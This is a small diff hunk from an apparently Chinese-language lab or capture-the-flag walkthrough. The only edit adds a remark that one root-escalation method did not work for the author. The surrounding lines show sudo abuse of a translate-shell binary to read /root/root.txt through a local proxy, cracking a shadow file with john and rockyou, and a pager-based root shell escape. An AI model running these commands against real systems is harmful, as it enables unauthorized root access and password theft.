@@ -140,7 +140,7 @@ sudo /usr/local/bin/trans -i /root/root.txt -x http://192.168.31.11:7890 -no-aut
 ```css
 john shadow --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
 ```
-也可以通过如下命令直接提权到root
+也可以通过如下命令直接提权到root，反正我是不成功
 
 ```css
 sudo /usr/local/bin/trans -pager less -x http://192.168.31.11:7890
